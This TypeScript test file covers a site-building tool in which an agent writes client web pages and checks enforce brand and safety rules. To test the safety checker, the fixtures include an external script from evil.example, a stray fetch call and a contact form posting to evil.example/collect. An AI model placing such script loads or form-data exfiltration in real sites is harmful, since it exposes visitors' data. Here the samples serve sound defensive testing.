import { describe, expect, it } from "vitest";
import { contentHash } from "../src/lib/files.js";
import { clientPaths } from "../src/lib/paths.js";
import * as tools from "../src/tools.js";
import { COMPLETE_CONTENT, COMPLETE_PATCH, installStubTemplate, tempFactory } from "./helpers.js";

const SLUG = "brine-barrel";

const BRAND = {
  concept: "Pickles that taste of a family kitchen: glass jars, brine and crunch.",
  personality: ["warm", "honest"],
  palette: { brine: "#2F4A2A", pepper: "#B3261E", paper: "#FCF6E8" },
  fonts: { heading: "Fraunces", body: "Nunito" },
  visualLanguage: "Rounded jar silhouettes, dill sprigs, brine bubbles and kraft labels.",
  voice: "Short and friendly.",
  animations: [
    { id: "jar-fill", idea: "Hero jars fill with brine on load", trigger: "load" },
    { id: "brine-bubbles", idea: "Bubbles rise from the cursor over the hero", trigger: "pointer" },
  ],
};

const CSS = `:root{--brine:#2F4A2A;--pepper:#B3261E;--paper:#FCF6E8}
.jar-fill{animation:jar-fill 4s ease infinite}@keyframes jar-fill{to{transform:scaleY(1)}}
[data-anim="brine-bubbles"]{opacity:.8}
@media (prefers-reduced-motion: reduce){*{animation:none!important}}`;

function page(title: string, body: string): string {
  return `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>${title}</title><meta name="description" content="Bridal alterations in Kingston upon Thames.">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fraunces"><link rel="stylesheet" href="/css/site.css"><link rel="icon" href="/brand/logo.svg"></head>
<body><header><a href="/"><img src="/brand/logo.svg" alt="Willow &amp; Thread"></a></header><main>${body}</main></body></html>`;
}

async function customClient() {
  const f = tempFactory();
  installStubTemplate(f.templatesDir);
  await tools.createClient(f, { slug: SLUG, businessName: "Willow & Thread", industry: "pickle shop", hostingModel: "managed", template: "custom" });
  tools.updateClientConfig(f, { slug: SLUG, patch: COMPLETE_PATCH });
  tools.saveContent(f, { slug: SLUG, locale: "en", content: COMPLETE_CONTENT });
  return { f, paths: clientPaths(f.clientsRoot, SLUG) };
}

function writeGoodSite(f: ReturnType<typeof tempFactory>) {
  const w = (path: string, content: string) => tools.writeSiteFileTool(f, { slug: SLUG, path, content });
  w("brand/brand.json", JSON.stringify(BRAND));
  w("brand/logo.svg", '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><circle cx="5" cy="5" r="4" fill="#2F4A2A"/></svg>');
  w("css/site.css", CSS);
  w("index.html", page("Willow & Thread", '<h1 class="jar-fill">Willow & Thread</h1><div data-anim="brine-bubbles"></div><a href="/contact/">Contact</a>'));
  w("contact/index.html", page("Contact | Willow & Thread", "<h1>Contact</h1>"));
  w("404.html", page("Not found | Willow & Thread", "<h1>Not found</h1>"));
}

describe("custom sites: the agent writes the site, the factory checks it", () => {
  it("only writes inside site/, with allowed file types, and only for custom clients", async () => {
    const { f } = await customClient();
    expect(() => tools.writeSiteFileTool(f, { slug: SLUG, path: "../site.config.json", content: "{}" })).toThrow(/not allowed/);
    expect(() => tools.writeSiteFileTool(f, { slug: SLUG, path: "/etc/x.html", content: "" })).toThrow(/not allowed/);
    expect(() => tools.writeSiteFileTool(f, { slug: SLUG, path: "run.sh", content: "" })).toThrow(/File type/);
    expect(() => tools.writeSiteFileTool(f, { slug: SLUG, path: "assets/a.svg", content: "" })).toThrow(/reserved/);

    tools.updateClientConfig(f, { slug: SLUG, patch: { template: "stub-v1" } });
    expect(() => tools.writeSiteFileTool(f, { slug: SLUG, path: "index.html", content: "<p>x</p>" })).toThrow(/do not write code/);
  });

  it("builds a site that has a brand identity and uses it", async () => {
    const { f, paths } = await customClient();
    writeGoodSite(f);
    const result = await tools.buildSite(f, { slug: SLUG });
    const failed = result.checks.filter((c) => c.status === "fail");
    expect(failed).toEqual([]);
    expect(result.passed).toBe(true);
    expect(result.checks.find((c) => c.name.startsWith("Brand identity"))?.detail).toMatch(/jar-fill, brine-bubbles/);
    expect(contentHash(paths.root)).toBeTruthy();
  });

  it("fails without a brand, with unused signature animations, or with unsafe code", async () => {
    const { f } = await customClient();
    tools.writeSiteFileTool(f, { slug: SLUG, path: "index.html", content: page("Home", "<h1>x</h1>") });
    tools.writeSiteFileTool(f, { slug: SLUG, path: "404.html", content: page("404", "<h1>x</h1>") });
    let r = await tools.buildSite(f, { slug: SLUG });
    expect(r.checks.find((c) => c.name.startsWith("Brand identity"))?.status).toBe("fail");

    writeGoodSite(f);
    tools.writeSiteFileTool(f, {
      slug: SLUG,
      path: "brand/brand.json",
      content: JSON.stringify({ ...BRAND, animations: [...BRAND.animations, { id: "lid-twist", idea: "Jar lid twists open on hover", trigger: "hover" }] }),
    });
    r = await tools.buildSite(f, { slug: SLUG });
    expect(r.checks.find((c) => c.name.startsWith("Brand identity"))?.detail).toMatch(/lid-twist/);

    writeGoodSite(f);
    tools.writeSiteFileTool(f, {
      slug: SLUG,
      path: "index.html",
      content: page(
        "Home",
        '<h1 class="jar-fill">x</h1><div data-anim="brine-bubbles"></div><script src="https://evil.example/x.js"></script><script>fetch("https://x.example")</script><a href="/nope/">x</a>',
      ),
    });
    r = await tools.buildSite(f, { slug: SLUG });
    const safety = r.checks.find((c) => c.name.startsWith("Custom code safety"));
    expect(safety?.status).toBe("fail");
    expect(safety?.detail).toMatch(/external <script src>/);
    expect(safety?.detail).toMatch(/network request/);
    expect(safety?.detail).toMatch(/broken link \/nope\//);
    expect(r.passed).toBe(false);
  });

  it("treats site files as inputs: changing one changes the content hash (approvals reset)", async () => {
    const { f, paths } = await customClient();
    writeGoodSite(f);
    const before = contentHash(paths.root);
    tools.writeSiteFileTool(f, { slug: SLUG, path: "css/site.css", content: `${CSS}\nh1{color:#B3261E}` });
    expect(contentHash(paths.root)).not.toBe(before);
  });
});

describe("brand board (Marka Atölyesi)", () => {
  it("warns (never fails) when the board is incomplete, passes when it is complete and used", async () => {
    const { f } = await customClient();
    writeGoodSite(f);
    let r = await tools.buildSite(f, { slug: SLUG });
    const board = () => r.checks.find((c) => c.name.startsWith("Brand board"));
    expect(board()?.status).toBe("warn");
    expect(r.passed).toBe(true);

    const full = {
      ...BRAND,
      tagline: "Crunch since 1962",
      typeSample: "Brine, dill and patience.",
      signature: { id: "jar-fill", name: "Kavanoz dolar", idea: "The jar fills with brine and settles, once." },
    };
    tools.writeSiteFileTool(f, { slug: SLUG, path: "brand/brand.json", content: JSON.stringify(full) });
    tools.writeSiteFileTool(f, { slug: SLUG, path: "brand/signature.html", content: page("Signature", '<div class="jar-fill"></div>') });
    r = await tools.buildSite(f, { slug: SLUG });
    expect(board()?.status).toBe("pass");

    tools.writeSiteFileTool(f, {
      slug: SLUG,
      path: "brand/brand.json",
      content: JSON.stringify({ ...full, signature: { ...full.signature, id: "lid-twist" } }),
    });
    r = await tools.buildSite(f, { slug: SLUG });
    expect(board()?.status).toBe("warn");
    expect(board()?.detail).toMatch(/lid-twist/);
  });
});

describe("design proposals", () => {
  it("reads three options, checks them like brand.json, and keeps them out of the published site", async () => {
    const { f, paths } = await customClient();
    writeGoodSite(f);
    const { readBrandOptions } = await import("../src/lib/custom-site.js");
    tools.writeSiteFileTool(f, { slug: SLUG, path: "brand/options/a.json", content: JSON.stringify({ ...BRAND, name: "Kitchen window" }) });
    tools.writeSiteFileTool(f, { slug: SLUG, path: "brand/options/a-logo.svg", content: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"/>' });
    tools.writeSiteFileTool(f, { slug: SLUG, path: "brand/options/b.json", content: JSON.stringify({ name: "Thin" }) });
    const options = readBrandOptions(paths);
    expect(options.map((o) => o.id)).toEqual(["a", "b"]);
    expect(options[0]!.problems).toEqual([]);
    expect(options[0]!.logoSvg).toContain("<svg");
    expect(options[1]!.problems.length).toBeGreaterThan(0);
    const r = await tools.buildSite(f, { slug: SLUG });
    expect(r.passed).toBe(true);
    const { existsSync } = await import("node:fs");
    const path = await import("node:path");
    expect(existsSync(path.join(paths.distDir, "brand", "options"))).toBe(false);
    expect(existsSync(path.join(paths.distDir, "brand", "brand.json"))).toBe(true);
  });
});

describe("fixes from real jobs", () => {
  it("removes a page together with its section settings, and accepts sections.<page>: null", async () => {
    const { f } = await customClient();
    const { readDraftConfig } = await import("../src/lib/client.js");
    const read = () => readDraftConfig(clientPaths(f.clientsRoot, SLUG)) as { pages: string[]; sections: Record<string, unknown> };
    const pages = read().pages;
    tools.updateClientConfig(f, { slug: SLUG, patch: { pages: pages.filter((p) => p !== "contact") } });
    expect(read().pages).not.toContain("contact");
    expect(read().sections.contact).toBeUndefined();
    tools.updateClientConfig(f, { slug: SLUG, patch: { pages: [...read().pages, "contact"], sections: { contact: ["contact-form"] } } });
    tools.updateClientConfig(f, { slug: SLUG, patch: { pages: read().pages.filter((p) => p !== "contact"), sections: { contact: null } } });
    expect(read().sections.contact).toBeUndefined();
  });

  it("finds a meta description with apostrophes and any attribute order", async () => {
    const { hasMetaDescription } = await import("../src/lib/quality.js");
    expect(hasMetaDescription(`<meta name="description" content="Ankara'nın erkek kuaförü">`)).toBe(true);
    expect(hasMetaDescription(`<meta content="Eryaman'da saç ve sakal" name="description">`)).toBe(true);
    expect(hasMetaDescription(`<meta name="description" content="kısa">`)).toBe(false);
  });
});

describe("design depth", () => {
  it("warns on a plain home page and passes a composed one with the signature in the hero", async () => {
    const { designDepth } = await import("../src/lib/custom-site.js");
    const { mkdtempSync, writeFileSync } = await import("node:fs");
    const os = await import("node:os");
    const path = await import("node:path");
    const dir = mkdtempSync(path.join(os.tmpdir(), "depth-"));
    const brand = { ...BRAND, signature: { id: "jar-fill", name: "Jar fills", idea: "The jar fills with brine and settles." } } as never;
    writeFileSync(path.join(dir, "index.html"), "<main><section><h1>Hi</h1></section><section><p>Prices</p></section></main>");
    let r = designDepth(dir, ".wrap{max-width:860px}@media (max-width: 1400px){a{b:c}}", brand);
    expect(r.status).toBe("warn");
    expect(r.detail).toMatch(/hero/);
    expect(r.detail).toMatch(/860px/);
    const svg = '<svg viewBox="0 0 1 1"></svg>';
    writeFileSync(
      path.join(dir, "index.html"),
      `<main><section class="hero"><div class="jar-fill">${svg}</div></section>${"<section>x</section>".repeat(4)}${svg}${svg}</main>`,
    );
    r = designDepth(dir, ":root{--wrap: 80rem}.wrap{max-width:var(--wrap)}", brand);
    expect(r.status).toBe("pass");
  });
});

describe("client's own logo", () => {
  it("builds the brand from an uploaded logo: no drawn logo needed, the file must be used on the pages", async () => {
    const { checkBrand } = await import("../src/lib/custom-site.js");
    const { mkdtempSync, writeFileSync, mkdirSync } = await import("node:fs");
    const os = await import("node:os");
    const path = await import("node:path");
    const dir = mkdtempSync(path.join(os.tmpdir(), "own-logo-"));
    mkdirSync(path.join(dir, "brand"));
    mkdirSync(path.join(dir, "assets"));
    writeFileSync(path.join(dir, "brand", "brand.json"), JSON.stringify(BRAND));
    writeFileSync(path.join(dir, "assets", "logo.png"), "png");
    writeFileSync(path.join(dir, "index.html"), `<style>${CSS}</style><h1 class="jar-fill"></h1><div data-anim="brine-bubbles"></div>`);
    expect(checkBrand(dir)[0]!.status).toBe("fail");
    let r = checkBrand(dir, "assets/logo.png");
    expect(r[0]!.detail).toMatch(/client's own logo/);
    writeFileSync(
      path.join(dir, "index.html"),
      `<img src="/assets/logo.png" alt="x"><style>${CSS}</style><h1 class="jar-fill"></h1><div data-anim="brine-bubbles"></div>`,
    );
    r = checkBrand(dir, "assets/logo.png");
    expect(r[0]!.status).toBe("pass");
    // A drawn logo next to the client's logo is refused.
    writeFileSync(path.join(dir, "brand", "logo.svg"), "<svg/>");
    r = checkBrand(dir, "assets/logo.png");
    expect(r[0]!.status).toBe("fail");
    expect(r[0]!.detail).toMatch(/do not use a drawn logo/);
  });
});

describe("failure messages", () => {
  it("explains the usage limit in Turkish", async () => {
    const { failureText } = await import("../src/panel/jobs.js");
    expect(failureText("You've hit your session limit · resets 6:50pm (Europe/Istanbul)", "success")).toMatch(/kullanım limitin doldu \(sıfırlanma: 6:50pm/);
    expect(failureText(undefined, "error_max_turns")).toMatch(/adım sınırı/);
  });
});

describe("design library", () => {
  it("start design chosen for a new client is offered once", async () => {
    const { f } = await customClient();
    writeGoodSite(f);
    const lib = await import("../src/panel/library.js");
    const meta = lib.saveToLibrary(f, SLUG, { name: "Kavanoz" });
    expect(() => lib.setStartDesign(f, SLUG, "nope")).toThrow();
    lib.setStartDesign(f, SLUG, meta.id);
    expect(lib.readStartDesign(f, SLUG)).toBe(meta.id);
    lib.clearStartDesign(f, SLUG);
    expect(lib.readStartDesign(f, SLUG)).toBeNull();
  });

  it("saves a design without the client's logo, starts another client from it, and fails while the source's facts remain", async () => {
    const { f } = await customClient();
    writeGoodSite(f);
    tools.updateClientConfig(f, {
      slug: SLUG,
      patch: { integrations: { bookingUrl: "https://cal.com/willow/intro" }, social: { instagram: "https://www.instagram.com/willowthread/" } },
    });
    const lib = await import("../src/panel/library.js");
    const meta = lib.saveToLibrary(f, SLUG, { name: "Kavanoz düzeni", tags: ["sıcak"] });
    // Booking and social links are the source's too, matched as they appear in text (no https://, no www.).
    expect(meta.forbidden).toContain("cal.com/willow/intro");
    expect(meta.forbidden).toContain("instagram.com/willowthread");
    expect(meta.id).toBe("kavanoz-duzeni");
    expect(meta.forbidden).toContain("Willow & Thread");
    expect(meta.forbidden).toContain("hello@willow.co.uk");
    expect(lib.listLibrary(f)[0]!.palette.brine).toBe("#2F4A2A");
    const { existsSync } = await import("node:fs");
    const path = await import("node:path");
    expect(existsSync(path.join(f.clientsRoot, "_library", meta.id, "site", "brand", "logo.svg"))).toBe(false);
    expect(tools.listClients(f).clients.map((c) => c.slug)).not.toContain("_library");

    await tools.createClient(f, { slug: "other-shop", businessName: "Other Shop", industry: "pickle shop", hostingModel: "managed", template: "custom" });
    tools.updateClientConfig(f, { slug: "other-shop", patch: COMPLETE_PATCH });
    tools.saveContent(f, { slug: "other-shop", locale: "en", content: COMPLETE_CONTENT });
    expect(() => lib.applyLibraryDesign(f, SLUG, meta.id)).toThrow(/zaten/);
    expect(meta.slots).toContainEqual({ text: "Willow & Thread", field: "name" });
    // Eren marks one more fixed place, for a fact the new client does not have yet.
    const w = (p: string, c: string) => tools.writeSiteFileTool(f, { slug: "other-shop", path: p, content: c });
    const designHome = path.join(f.clientsRoot, "_library", meta.id, "site", "index.html");
    const { readFileSync, writeFileSync } = await import("node:fs");
    writeFileSync(designHome, readFileSync(designHome, "utf8").replace("</h1>", "</h1><p>12 Kings Road, Bath</p>"));
    lib.updateLibraryEntry(f, meta.id, { slots: [...meta.slots, { text: "12 Kings Road, Bath", field: "address" }] });
    expect(lib.slotCounts(f, meta.id).at(-1)).toBe(1);
    // A place removed again is no longer forbidden; the source's own facts stay forbidden.
    lib.updateLibraryEntry(f, meta.id, { slots: [...meta.slots, { text: "Ankara merkez", field: "address" }] });
    expect(lib.updateLibraryEntry(f, meta.id, { slots: meta.slots }).forbidden).not.toContain("Ankara merkez");
    lib.updateLibraryEntry(f, meta.id, { slots: [...meta.slots, { text: "12 Kings Road, Bath", field: "address" }] });
    expect(lib.listLibrary(f)[0]!.forbidden).toContain("Willow & Thread");
    expect(() => lib.updateLibraryEntry(f, meta.id, { slots: [{ text: "x", field: "name" }] })).toThrow(/Sabit alan/);

    const applied = lib.applyLibraryDesign(f, "other-shop", meta.id);
    expect(applied.filled.find((x) => x.field === "name")?.count).toBeGreaterThan(0);
    expect(applied.missing).toEqual(["Instagram", "Adres"]); // the new client has no Instagram account yet
    // The panel put the new name in place itself (escaped in markup).
    expect(tools.readSiteFileTool(f, { slug: "other-shop", path: "index.html" }).content).toContain("Other Shop");
    expect(tools.readSiteFileTool(f, { slug: "other-shop", path: "index.html" }).content).not.toContain("Willow");
    w("brand/logo.svg", '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><circle cx="5" cy="5" r="4" fill="#2F4A2A"/></svg>');
    let r = await tools.buildSite(f, { slug: "other-shop" });
    const left = () => r.checks.find((c) => c.name.startsWith("Library design"));
    expect(left()?.status).toBe("fail");
    expect(left()?.detail).toMatch(/Kings Road/);
    w("index.html", tools.readSiteFileTool(f, { slug: "other-shop", path: "index.html" }).content.replace("<p>12 Kings Road, Bath</p>", ""));
    r = await tools.buildSite(f, { slug: "other-shop" });
    expect(left()?.status).toBe("pass");
    lib.deleteFromLibrary(f, meta.id);
    expect(lib.listLibrary(f)).toEqual([]);
  });
});

describe("contact form per client", () => {
  it("accepts only the form address Eren set (from .factory), and tells the agent", async () => {
    const { f, paths } = await customClient();
    writeGoodSite(f);
    const { writeFileSync, mkdirSync } = await import("node:fs");
    const path = await import("node:path");
    const formPage = (action: string) =>
      page(
        "Contact | Willow & Thread",
        `<h1>Contact</h1><form action="${action}" method="POST"><label>E-mail <input name="email" type="email"></label><button>Send</button></form>`,
      );
    tools.writeSiteFileTool(f, { slug: SLUG, path: "contact/index.html", content: formPage("https://formspree.io/f/abcd1234") });
    let r = await tools.buildSite(f, { slug: SLUG });
    expect(r.checks.find((c) => c.name.startsWith("Custom code safety"))?.status).toBe("fail");
    mkdirSync(paths.factoryDir, { recursive: true });
    writeFileSync(path.join(paths.factoryDir, "form.json"), JSON.stringify({ action: "https://formspree.io/f/abcd1234" }));
    expect(tools.getClientStatus(f, { slug: SLUG }).contactForm).toEqual({ action: "https://formspree.io/f/abcd1234" });
    r = await tools.buildSite(f, { slug: SLUG });
    expect(r.checks.find((c) => c.name.startsWith("Custom code safety"))?.status).toBe("pass");
    tools.writeSiteFileTool(f, { slug: SLUG, path: "contact/index.html", content: formPage("https://evil.example/collect") });
    r = await tools.buildSite(f, { slug: SLUG });
    expect(r.checks.find((c) => c.name.startsWith("Custom code safety"))?.status).toBe("fail");
    writeFileSync(path.join(paths.factoryDir, "form.json"), JSON.stringify({ action: "https://evil.example/collect" }));
    expect(tools.getClientStatus(f, { slug: SLUG }).contactForm).toBeNull();
  });
});

describe("cheap edits: site map, part reads and exact replacements", () => {
  it("maps the site, reads a part and replaces exact text once", async () => {
    const { f } = await customClient();
    writeGoodSite(f);
    const map = tools.siteMapTool(f, { slug: SLUG }).map;
    expect(map).toMatch(/index\.html .*h1: "Willow & Thread"/);
    expect(map).toMatch(/css\/site\.css .*keyframes: jar-fill/);
    expect(map).toMatch(/--brine: #2F4A2A/);
    const part = tools.readSiteFileAroundTool(f, { slug: SLUG, path: "index.html", around: "Contact", lines: 6 });
    expect(part.content).toContain("Contact");
    expect(() => tools.editSiteFileTool(f, { slug: SLUG, path: "index.html", oldText: "nope-not-here", newText: "x" })).toThrow(/not in/);
    expect(() => tools.editSiteFileTool(f, { slug: SLUG, path: "index.html", oldText: "<", newText: "x" })).toThrow(/occurs/);
    const r = tools.editSiteFileTool(f, {
      slug: SLUG,
      path: "index.html",
      oldText: '<a href="/contact/">Contact</a>',
      newText: '<a href="/contact/">Get in touch</a>',
    });
    expect(r.replaced).toBe(1);
    expect(tools.readSiteFileTool(f, { slug: SLUG, path: "index.html" }).content).toContain("Get in touch");
    expect(() => tools.editSiteFileTool(f, { slug: SLUG, path: "../site.config.json", oldText: "a", newText: "b" })).toThrow(/not allowed/);
  });
});

describe("token savers in the factory", () => {
  it("reports safety problems when a file is written, not only at build time", async () => {
    const { f } = await customClient();
    const bad = tools.writeSiteFileTool(f, { slug: SLUG, path: "js/x.js", content: 'fetch("https://x.example")' }) as { problems?: string[] };
    expect(bad.problems?.[0]).toMatch(/network request/);
    const good = tools.writeSiteFileTool(f, { slug: SLUG, path: "js/y.js", content: "console.log(1)" }) as { problems?: string[] };
    expect(good.problems).toBeUndefined();
  });

  it("replaces exact text and colours across the site, escaping for HTML", async () => {
    const { f, paths } = await customClient();
    writeGoodSite(f);
    const { findInSite, replaceInSite } = await import("../src/lib/site-replace.js");
    expect(findInSite(paths, "Willow & Thread", { html: true })).toBeGreaterThan(0);
    replaceInSite(paths, [["Willow & Thread", "Oak & Co"]], { html: true });
    expect(tools.readSiteFileTool(f, { slug: SLUG, path: "index.html" }).content).toContain("Oak &amp; Co");
    replaceInSite(paths, [["#2f4a2a", "#123456"]], { caseInsensitive: true });
    expect(tools.readSiteFileTool(f, { slug: SLUG, path: "css/site.css" }).content).toContain("#123456");
    expect(tools.readSiteFileTool(f, { slug: SLUG, path: "brand/brand.json" }).content).toContain("#123456");
  });

  it("keeps research notes for later jobs and gives the base stylesheet once", async () => {
    const { f, paths } = await customClient();
    tools.saveResearchNotes(f, { slug: SLUG, notes: "Verified: open since 1998 (source: https://example.org)." });
    expect(tools.getClientStatus(f, { slug: SLUG }).researchNotes?.text).toMatch(/1998/);
    const { ensureBaseKit } = await import("../src/lib/custom-site.js");
    const { FACTORY_ROOT } = await import("../src/config.js");
    const path = await import("node:path");
    expect(ensureBaseKit(paths, path.join(FACTORY_ROOT, "rules", "site-kit", "base.css"))).toBe(true);
    expect(ensureBaseKit(paths, path.join(FACTORY_ROOT, "rules", "site-kit", "base.css"))).toBe(false);
    expect(tools.readSiteFileTool(f, { slug: SLUG, path: "css/base.css" }).content).toMatch(/prefers-reduced-motion/);
  });
});
